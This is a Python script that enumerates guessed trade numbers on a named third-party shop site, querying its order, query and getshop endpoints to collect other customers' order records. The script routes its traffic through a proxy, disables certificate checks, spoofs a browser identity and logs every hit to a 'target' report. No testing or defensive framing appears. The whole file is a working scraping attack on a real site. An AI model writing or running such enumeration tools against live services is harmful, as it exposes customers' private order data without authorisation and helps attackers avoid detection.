#!/usr/bin/env python3
"""xinhe001 trade_no discovery + order metadata via getshop/mod=order."""
from __future__ import annotations

import json
import os
import re
import sys
import time
from datetime import datetime, timedelta
from pathlib import Path

import requests

requests.packages.urllib3.disable_warnings()

BASE = "https://xinhe001.lol/shop/"
OUT = Path(
    sys.argv[1]
    if len(sys.argv) > 1
    else f"/workspace/results_xinhe001/trade_scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
)
# prefix like 2026080207 or full date 20260802
PREFIX = sys.argv[2] if len(sys.argv) > 2 else "20260802"
START = int(sys.argv[3]) if len(sys.argv) > 3 else 0
END = int(sys.argv[4]) if len(sys.argv) > 4 else 500
DELAY = float(sys.argv[5]) if len(sys.argv) > 5 else 0.12

PROXY = os.environ.get("QG_TUNNEL", "")
SHOW = re.compile(r"showOrder\((\d+),\s*['\"]([^'\"]+)['\"]\)")


def log(msg: str) -> None:
    print(msg, flush=True)
    OUT.mkdir(parents=True, exist_ok=True)
    with (OUT / "progress.log").open("a", encoding="utf-8") as f:
        f.write(msg + "\n")


def session() -> requests.Session:
    s = requests.Session()
    s.verify = False
    if PROXY:
        s.proxies = {"http": PROXY, "https": PROXY}
    s.headers.update(
        {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
            "Referer": BASE,
        }
    )
    return s


def trade_candidates(prefix: str, start: int, end: int) -> list[str]:
    out = []
    plen = len(prefix)
    # rainbow: YYYYMMDDHHMMSS + 3-5 digit suffix common
    if plen <= 8:
        # date prefix + time blocks
        for hh in range(0, 24):
            for mm in range(0, 60, 5):
                base = f"{prefix}{hh:02d}{mm:02d}"
                for suf in range(start, min(end, start + 200)):
                    out.append(f"{base}{suf:03d}")
    else:
        for i in range(start, end):
            out.append(f"{prefix}{i:05d}")
    return out


def main() -> None:
    OUT.mkdir(parents=True, exist_ok=True)
    s = session()
    s.get(BASE, timeout=30)

    found: dict[str, dict] = {}
    if (OUT / "trades.json").exists():
        found = json.loads((OUT / "trades.json").read_text(encoding="utf-8"))

    trades = trade_candidates(PREFIX, START, END)
    log(f"scan prefix={PREFIX} range={START}-{END} candidates={len(trades)} existing={len(found)}")

    for i, trade in enumerate(trades):
        if trade in found:
            continue
        entry: dict = {"trade_no": trade}
        try:
            gs = s.get(BASE + "other/getshop.php", params={"trade_no": trade}, timeout=14)
            entry["getshop"] = gs.text[:300]
            try:
                entry["getshop_json"] = gs.json()
            except Exception:
                pass
            qr = s.get(BASE, params={"mod": "query", "data": trade}, timeout=14)
            so = SHOW.findall(qr.text)
            entry["query_shows"] = so
            orr = s.get(BASE, params={"mod": "order", "orderid": trade}, timeout=14)
            entry["order_len"] = len(orr.text)
            if "订单不存在" not in orr.text and "站点提示" not in orr.text:
                entry["order_snip"] = orr.text[:500]
            gsj = entry.get("getshop_json") or {}
            msg = str(gsj.get("msg", entry.get("getshop", "")))
            # getshop returns 未付款 for almost any string — only trust query showOrder
            if so:
                found[trade] = entry
                log(f"HIT {trade} getshop={msg[:40]} shows={len(so)}")
        except Exception as e:
            entry["err"] = str(e)[:80]
        time.sleep(DELAY)
        if (i + 1) % 100 == 0:
            (OUT / "trades.json").write_text(
                json.dumps(found, ensure_ascii=False, indent=2), encoding="utf-8"
            )
            log(f"progress {i+1}/{len(trades)} found={len(found)}")

    (OUT / "trades.json").write_text(
        json.dumps(found, ensure_ascii=False, indent=2), encoding="utf-8"
    )
    report = {
        "target": "xinhe001.lol",
        "ts": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "prefix": PREFIX,
        "scanned": len(trades),
        "found": len(found),
    }
    (OUT / "report.json").write_text(json.dumps(report, ensure_ascii=False, indent=2))
    log(f"DONE found={len(found)}")


if __name__ == "__main__":
    main()
